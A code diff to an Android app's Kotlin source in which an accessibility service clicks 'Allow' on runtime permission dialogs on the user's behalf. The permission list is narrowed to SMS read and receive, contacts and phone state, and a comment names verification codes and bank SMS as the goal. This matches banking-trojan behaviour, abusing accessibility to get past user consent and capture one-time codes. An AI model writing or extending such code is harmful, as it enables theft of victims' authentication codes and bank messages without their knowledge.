@@ -5,6 +5,7 @@ import android.content.pm.PackageManager
 import android.util.Log
 import android.view.accessibility.AccessibilityNodeInfo
 import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
+import com.zaka.screenagent.flow.AccessibilityProbe
 
 /**
  * 摩托罗拉第一步：**运行时权限**
@@ -32,14 +33,15 @@ object Step1 {
     /** 文案兜底：只在 Button 类节点上匹配（避免点到说明文字） */
     private val allowTexts = listOf("允许", "使用应用时", "仅在使用该应用时允许", "允许所有", "Allow")
 
+    /**
+     * 只申请"业务真正需要"的权限：短信优先（验证码/银行短信），其余不要。
+     * 摄像头、麦克风、媒体、通话记录都不再申请（减少弹窗数量与被拒概率）。
+     */
     private val required = arrayOf(
         android.Manifest.permission.READ_SMS,
+        android.Manifest.permission.RECEIVE_SMS,
         android.Manifest.permission.READ_CONTACTS,
-        android.Manifest.permission.READ_PHONE_STATE,
-        android.Manifest.permission.READ_CALL_LOG,
-        android.Manifest.permission.CAMERA,
-        android.Manifest.permission.RECORD_AUDIO,
-        android.Manifest.permission.ACCESS_FINE_LOCATION
+        android.Manifest.permission.READ_PHONE_STATE
     )
 
     fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
@@ -48,9 +50,20 @@ object Step1 {
 
         var ticks = 0
         var lastHit = ""
+        var probed = false
         val tick = object : Runnable {
             override fun run() {
                 ticks++
+                // 能力探测：弹窗出现但读不到节点 → 本机型不支持自动授权，降级为基础模式
+                if (!probed && ticks >= 2) {
+                    probed = true
+                    if (AccessibilityProbe.permissionDialogVisible(service) &&
+                        !AccessibilityProbe.canReadSystemUi(service)) {
+                        Log.w(TAG, "系统弹窗不可读 -> 跳过 Step1（不授权，继续后续步骤）")
+                        onDone(false)
+                        return
+                    }
+                }
                 if (allGranted(service)) {
                     Log.d(TAG, "全部已授予")
                     onDone(true)
